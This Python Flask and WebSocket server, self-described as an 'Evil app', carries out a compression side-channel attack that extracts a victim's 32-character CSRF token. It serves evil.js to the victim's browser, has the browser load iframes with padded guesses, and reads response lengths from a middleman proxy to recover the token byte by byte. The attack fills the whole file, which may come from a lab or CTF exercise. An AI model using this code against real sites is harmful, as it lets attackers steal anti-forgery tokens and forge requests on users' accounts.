import os
import flask
from simple_websocket import ws
import flask_sock
import logging
import random
import requests
import queue
import math

MIDDLEMAN_HOST = '172.31.221.108'
MIDDLEMAN_PORT = 7000

HEX_ALPHABET = '0123456789abcdef'
CSRF_LEN = 32

logger = logging.getLogger("Evil app")
logger.setLevel(logging.DEBUG)

fh = logging.FileHandler("middleman.log")
fh.setLevel(logging.DEBUG)
logger.addHandler(fh)

class MiddlemanSession(requests.Session):
    _host: str
    _port: int

    def __init__(self, host: str, port: int, *args, **kwargs):
        self._host = host
        self._port = port
        super().__init__(*args,**kwargs)

    def clear_conversations(self):
        r = self.delete(f"http://{self._host}:{self._port}/conversations")
        if r.status_code // 100 != 2:
            logger.error(f"got error: {r.text}")
            r.raise_for_status()
        logger.debug("Cleared conversations successfully.")
    
    def get_page_len(self):
        r = self.get(f"http://{self._host}:{self._port}/conversations/page_len")
        if r.status_code != 200:
            logger.error(f"got error: {r.text}")
            r.raise_for_status()
        logger.debug(f"Got page size response {r.status_code}: {r.json()}")
        return r.json()['page_size']


files = [f.name for f in os.scandir(".") if not f.is_dir() and f.name[:-3] != '.py' and f.name[:-5] != '.json']
files = set(files)

app = flask.Flask(__name__,template_folder=os.getcwd())

sock = flask_sock.Sock(app)

def gen_padded(st: str):
    padding = ''.join(random.choices(['-','.',',','_','$','~'],k=16))
    return st + padding, padding[:len(padding)//2] + st + padding[len(padding)//2:]


@app.route("/evil.js")
def serve_evil_js():
    return flask.send_file("evil.js")

@app.route("/")
def index():
    return flask.render_template("index.html")

@sock.route("/crack")
def crack(ws: ws.Server):
    try:
        data = ws.receive()
        if(data != "ready"):
            ws.close()
            return
        
        ping = requests.get(f"http://{MIDDLEMAN_HOST}:{MIDDLEMAN_PORT}/",timeout=3)
        if ping.status_code // 100 != 2:
            ping.raise_for_status()
        current_token = ''
        def get_len(token: str) -> int:
            with MiddlemanSession(MIDDLEMAN_HOST,MIDDLEMAN_PORT) as session:
                session.clear_conversations()
                ws.send(f"iframe\n{token}")
                if ws.receive() != 'page_loaded':
                    raise ValueError("client error")
                return session.get_page_len()
        def test_with_padding(ch: str) -> bool:
            with MiddlemanSession(MIDDLEMAN_HOST,MIDDLEMAN_PORT) as session:
                p1, p2 = gen_padded(ch)

                shorter = current_token + p1
                longer = current_token + p2
                
                session.clear_conversations()
                ws.send(f'iframe\n{shorter}')
                if ws.receive() != 'page_loaded':
                    raise ValueError("client error")
                l1 = session.get_page_len()

                session.clear_conversations()
                ws.send(f"iframe\n{longer}")
                if ws.receive() != 'page_loaded':
                    raise ValueError("client error")
                l2 = session.get_page_len()

                return l1 < l2
        
        token_candidates = queue.PriorityQueue()
        token_candidates.put_nowait((0, '')) #if multiple answers are found, prioritize ones where the size of the page does not increase when the character is appended.
        possible_tokens = []
        while not token_candidates.empty():
            current_token = token_candidates.get_nowait()[1]
            if len(current_token) == CSRF_LEN:
                possible_tokens.append(current_token)
                continue

            best_answer = None
            best_proportion = -math.inf
            for possible_byte in HEX_ALPHABET:
                tests = [test_with_padding(possible_byte) for _ in range(5)]
                p = tests.count(True)
                if p > best_proportion:
                    best_proportion = p
                    best_answer = possible_byte

            token_candidates.put_nowait((0, current_token + best_answer))

        ws.send("done\ntoken extracted")
        ws.close_reason = "token extracted"
        ws.close()
    except Exception as e:
        ws.send(f"done\n{e}")
        ws.close_reason = str(e)
        ws.close()
        raise e

app.run("127.0.0.1",4000)